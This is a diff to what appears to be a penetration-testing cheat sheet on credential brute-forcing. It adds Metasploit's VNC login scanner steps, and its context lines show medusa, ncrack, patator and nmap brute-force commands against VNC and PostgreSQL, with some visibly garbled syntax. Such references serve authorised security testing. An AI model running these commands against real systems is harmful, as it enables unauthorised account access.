@@ -22,7 +22,7 @@ If you want to **share some tricks with the community** you can also submit **pu
 * [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
 * [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
 * [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
-* [**https://many-passwords.github.io/**](https://many-passwords.github.io)****
+* [**https://many-passwords.github.io/**](https://many-passwords.github.io)\*\*\*\*
 
 ## **Create your own Dictionaries**
 
@@ -393,6 +393,11 @@ medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+
+#Metasploit
+use auxiliary/scanner/vnc/vnc_login
+set RHOSTS <ip>
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```
 
 ### Winrm
